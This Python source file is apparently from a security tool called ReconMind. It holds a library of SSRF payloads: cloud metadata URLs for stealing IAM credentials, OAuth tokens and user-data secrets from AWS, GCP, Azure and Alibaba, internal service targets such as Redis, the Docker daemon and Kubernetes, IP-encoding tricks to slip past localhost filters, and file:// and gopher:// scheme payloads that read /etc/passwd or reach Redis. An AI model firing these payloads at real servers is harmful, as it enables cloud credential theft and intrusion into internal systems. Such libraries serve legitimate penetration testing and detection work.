"""
core/payloads/ssrf_payloads.py
================================
SSRF payload and target library for ReconMind by wamiqsec.

Why this file exists:
    SSRF requires knowing WHAT to probe for, not just HOW to inject.
    This library catalogs:
        1. Cloud metadata endpoints by provider (AWS, GCP, Azure, Alibaba)
        2. Internal service discovery targets (Redis, Elasticsearch, k8s)
        3. URL scheme bypasses (dict://, gopher://, file://)
        4. IP representation tricks to bypass allowlist filters
        5. DNS rebinding indicator URLs

Architecture benefit:
    Separating the "what to probe" from the "how to probe" (ssrf_tester.py)
    means we can update targets without touching engine logic.
    A security researcher can add a new cloud provider's metadata endpoint
    here without reading the tester code.
"""

from typing import List, Dict, Any

SSRFTarget = Dict[str, Any]


# ---------------------------------------------------------------------------
# Cloud metadata endpoints — these are the crown jewels of SSRF
# ---------------------------------------------------------------------------

AWS_METADATA_TARGETS: List[SSRFTarget] = [
    {
        "url": "http://169.254.169.254/latest/meta-data/",
        "provider": "AWS",
        "description": "AWS IMDSv1 root — lists available metadata categories",
        "signatures": ["ami-id", "instance-id", "hostname", "public-keys"],
        "severity": "CRITICAL",
    },
    {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "provider": "AWS",
        "description": "AWS IAM role names — follow up to steal credentials",
        "signatures": ["iam/", "role", "AmazonEC2"],
        "severity": "CRITICAL",
    },
    {
        "url": "http://169.254.169.254/latest/user-data",
        "provider": "AWS",
        "description": "AWS user-data — often contains bootstrap scripts with secrets",
        "signatures": ["#!/bin/bash", "export ", "PASSWORD=", "SECRET="],
        "severity": "CRITICAL",
    },
    {
        "url": "http://169.254.169.254/latest/meta-data/hostname",
        "provider": "AWS",
        "description": "AWS hostname — confirms IMDSv1 access",
        "signatures": ["ec2.internal", "compute.internal", "amazonaws.com"],
        "severity": "HIGH",
    },
    {
        "url": "http://169.254.169.254/latest/meta-data/public-keys/",
        "provider": "AWS",
        "description": "AWS SSH public keys attached to instance",
        "signatures": ["0=", "openssh-key"],
        "severity": "HIGH",
    },
]

GCP_METADATA_TARGETS: List[SSRFTarget] = [
    {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "provider": "GCP",
        "description": "GCP metadata root (requires Metadata-Flavor header)",
        "signatures": ["instance", "project", "serviceAccounts"],
        "severity": "CRITICAL",
        "required_headers": {"Metadata-Flavor": "Google"},
    },
    {
        "url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "provider": "GCP",
        "description": "GCP service account OAuth token",
        "signatures": ["access_token", "token_type", "expires_in"],
        "severity": "CRITICAL",
    },
    {
        "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "provider": "GCP",
        "description": "GCP project ID",
        "signatures": ["my-project", "-"],
        "severity": "HIGH",
    },
]

AZURE_METADATA_TARGETS: List[SSRFTarget] = [
    {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "provider": "Azure",
        "description": "Azure IMDS instance metadata",
        "signatures": ["subscriptionId", "resourceGroupName", "vmId"],
        "severity": "CRITICAL",
        "required_headers": {"Metadata": "true"},
    },
    {
        "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "provider": "Azure",
        "description": "Azure Managed Identity token",
        "signatures": ["access_token", "token_type"],
        "severity": "CRITICAL",
    },
]

ALIBABA_METADATA_TARGETS: List[SSRFTarget] = [
    {
        "url": "http://100.100.100.200/latest/meta-data/",
        "provider": "Alibaba",
        "description": "Alibaba Cloud ECS metadata",
        "signatures": ["instance-id", "hostname", "ram"],
        "severity": "CRITICAL",
    },
]


# ---------------------------------------------------------------------------
# Internal service discovery targets
# Probing these tests if the server can reach internal infrastructure
# ---------------------------------------------------------------------------

INTERNAL_SERVICE_TARGETS: List[SSRFTarget] = [
    # Redis — often unauthenticated, trivial to RCE via RESP protocol
    {
        "url": "http://127.0.0.1:6379/",
        "service": "Redis",
        "description": "Redis default port — responds with -ERR",
        "signatures": ["-ERR", "WRONGTYPE", "+PONG"],
        "severity": "HIGH",
    },
    # Elasticsearch — unauth access to all data
    {
        "url": "http://127.0.0.1:9200/",
        "service": "Elasticsearch",
        "description": "Elasticsearch root — cluster info",
        "signatures": ["cluster_name", "tagline", "You Know, for Search"],
        "severity": "HIGH",
    },
    # Kubernetes API
    {
        "url": "https://kubernetes.default.svc/api",
        "service": "Kubernetes API",
        "description": "K8s API server default service DNS",
        "signatures": ["apiVersion", "kind", "ServerVersion"],
        "severity": "CRITICAL",
    },
    # Consul
    {
        "url": "http://127.0.0.1:8500/v1/agent/self",
        "service": "Consul",
        "description": "HashiCorp Consul agent info",
        "signatures": ["Config", "Member", "datacenter"],
        "severity": "HIGH",
    },
    # Internal admin panels
    {
        "url": "http://127.0.0.1:8080/",
        "service": "Internal HTTP (8080)",
        "description": "Common internal service port",
        "signatures": [],   # Any 200 response is interesting
        "severity": "MEDIUM",
    },
    {
        "url": "http://127.0.0.1:8443/",
        "service": "Internal HTTPS (8443)",
        "description": "Common internal HTTPS service",
        "signatures": [],
        "severity": "MEDIUM",
    },
    # Docker socket via HTTP
    {
        "url": "http://127.0.0.1:2375/info",
        "service": "Docker daemon",
        "description": "Docker TCP socket — unauth container control",
        "signatures": ["Containers", "DockerRootDir", "ServerVersion"],
        "severity": "CRITICAL",
    },
]


# ---------------------------------------------------------------------------
# Localhost bypass payloads
# Used when "localhost" or "127.0.0.1" is blocked by application filters
# ---------------------------------------------------------------------------

LOCALHOST_BYPASSES: List[Dict[str, str]] = [
    {"value": "http://127.0.0.1",         "technique": "IPv4 loopback"},
    {"value": "http://0.0.0.0",           "technique": "INADDR_ANY"},
    {"value": "http://0",                  "technique": "Short zero"},
    {"value": "http://[::1]",              "technique": "IPv6 loopback"},
    {"value": "http://[0:0:0:0:0:0:0:1]", "technique": "IPv6 full loopback"},
    {"value": "http://localhost",          "technique": "Hostname localhost"},
    {"value": "http://LOCALHOST",          "technique": "Uppercase LOCALHOST"},
    {"value": "http://127.1",              "technique": "Shortened 127.1"},
    {"value": "http://127.0.1",            "technique": "Shortened 127.0.1"},
    {"value": "http://2130706433",         "technique": "Decimal IP (127.0.0.1)"},
    {"value": "http://0x7f000001",         "technique": "Hex IP (127.0.0.1)"},
    {"value": "http://0177.0.0.1",         "technique": "Octal IP"},
    {"value": "http://127.000.000.001",    "technique": "Leading zeros"},
    {"value": "http://spoofed.burpcollaborator.net", "technique": "DNS rebind to 127.0.0.1"},
]


# ---------------------------------------------------------------------------
# URL scheme payloads — test alternative protocol handlers
# ---------------------------------------------------------------------------

SCHEME_PAYLOADS: List[Dict[str, str]] = [
    {
        "value": "file:///etc/passwd",
        "scheme": "file://",
        "technique": "file:// → /etc/passwd",
        "signatures": ["root:x:0:0"],
    },
    {
        "value": "file:///C:/Windows/win.ini",
        "scheme": "file://",
        "technique": "file:// → win.ini (Windows)",
        "signatures": ["[extensions]"],
    },
    {
        "value": "dict://127.0.0.1:6379/info",
        "scheme": "dict://",
        "technique": "dict:// → Redis INFO (SSRF via dict protocol)",
        "signatures": ["redis_version", "tcp_port"],
    },
    {
        "value": "gopher://127.0.0.1:6379/_INFO",
        "scheme": "gopher://",
        "technique": "gopher:// → Redis (Gopher SSRF)",
        "signatures": ["redis_version"],
    },
    {
        "value": "ftp://127.0.0.1/",
        "scheme": "ftp://",
        "technique": "ftp:// → internal FTP",
        "signatures": ["220", "FTP"],
    },
    {
        "value": "ldap://127.0.0.1:389/",
        "scheme": "ldap://",
        "technique": "ldap:// → internal LDAP",
        "signatures": [],
    },
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def get_all_metadata_targets() -> List[SSRFTarget]:
    """Return all cloud metadata targets, ordered by severity."""
    all_targets = (
        AWS_METADATA_TARGETS +
        GCP_METADATA_TARGETS +
        AZURE_METADATA_TARGETS +
        ALIBABA_METADATA_TARGETS
    )
    # Sort: CRITICAL first
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
    return sorted(all_targets, key=lambda t: severity_order.get(t.get("severity", "MEDIUM"), 9))


def get_all_internal_targets() -> List[SSRFTarget]:
    """Return all internal service discovery targets."""
    return INTERNAL_SERVICE_TARGETS


def get_localhost_bypasses() -> List[Dict[str, str]]:
    """Return all localhost bypass techniques."""
    return LOCALHOST_BYPASSES


def get_scheme_payloads() -> List[Dict[str, str]]:
    """Return all alternative URL scheme payloads."""
    return SCHEME_PAYLOADS


def get_all_signatures() -> Dict[str, List[str]]:
    """Return a flat dict of URL → signatures for fast lookups."""
    sigs = {}
    for target in get_all_metadata_targets() + get_all_internal_targets():
        url = target.get("url", "")
        if url and target.get("signatures"):
            sigs[url] = target["signatures"]
    return sigs
